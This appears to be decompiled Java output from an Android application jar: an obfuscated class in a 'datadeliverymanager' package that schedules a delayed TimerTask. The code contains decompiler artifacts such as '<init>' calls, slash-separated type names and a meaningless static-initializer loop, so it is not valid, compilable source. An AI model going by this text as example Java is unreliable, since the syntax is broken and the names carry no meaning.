package com.vvt.datadeliverymanager;

import com.vvt.datadeliverymanager.a.c;
import java.util.Timer;
import java.util.TimerTask;

public class p
{
  private static final boolean a;
  private long b;
  private long c;
  private c d;
  private Timer e;
  private TimerTask f;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  public p(long paramLong1, long paramLong2, c paramc)
  {
    q localq = new com/vvt/datadeliverymanager/q;
    localq.<init>(this);
    this.f = localq;
    this.b = paramLong1;
    this.c = paramLong2;
    this.d = paramc;
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    Timer localTimer = this.e;
    if (localTimer == null)
    {
      localTimer = new java/util/Timer;
      localTimer.<init>();
      this.e = localTimer;
    }
    localTimer = this.e;
    TimerTask localTimerTask = this.f;
    long l = this.c;
    localTimer.schedule(localTimerTask, l);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/p.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */